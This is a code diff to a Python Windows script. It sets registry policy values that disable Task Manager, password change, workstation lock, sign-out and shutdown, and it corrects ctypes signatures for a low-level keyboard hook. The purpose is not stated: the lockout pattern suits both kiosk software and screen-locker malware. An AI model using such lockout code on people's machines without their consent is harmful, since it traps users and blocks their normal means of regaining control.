@@ -15,9 +15,19 @@ kernel32 = ctypes.windll.kernel32
 
 def set_task_manager_disabled(disable: bool):
     try:
+        val = 1 if disable else 0
+        # Disable Task Manager, Change Password, and Lock Workstation
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if disable else 0)
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, val)
+        winreg.SetValueEx(key, "DisableChangePassword", 0, winreg.REG_DWORD, val)
+        winreg.SetValueEx(key, "DisableLockWorkstation", 0, winreg.REG_DWORD, val)
         winreg.CloseKey(key)
+        
+        # Disable Sign out (Logoff) and Shut Down (NoClose)
+        key_exp = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
+        winreg.SetValueEx(key_exp, "NoLogoff", 0, winreg.REG_DWORD, val)
+        winreg.SetValueEx(key_exp, "NoClose", 0, winreg.REG_DWORD, val)
+        winreg.CloseKey(key_exp)
     except Exception:
         pass
 
@@ -45,7 +55,22 @@ def keyboard_hook_proc(nCode, wParam, lParam):
             
     return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)
 
-HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
+# Setup correct ctypes signatures to prevent 64-bit pointer truncation
+LRESULT = ctypes.c_ssize_t
+HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
+
+user32.SetWindowsHookExW.argtypes = [ctypes.c_int, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD]
+user32.SetWindowsHookExW.restype = wintypes.HHOOK
+
+user32.CallNextHookEx.argtypes = [wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
+user32.CallNextHookEx.restype = LRESULT
+
+user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
+user32.UnhookWindowsHookEx.restype = wintypes.BOOL
+
+kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
+kernel32.GetModuleHandleW.restype = wintypes.HINSTANCE
+
 hook_callback = HOOKPROC(keyboard_hook_proc)
 
 def hook_loop():
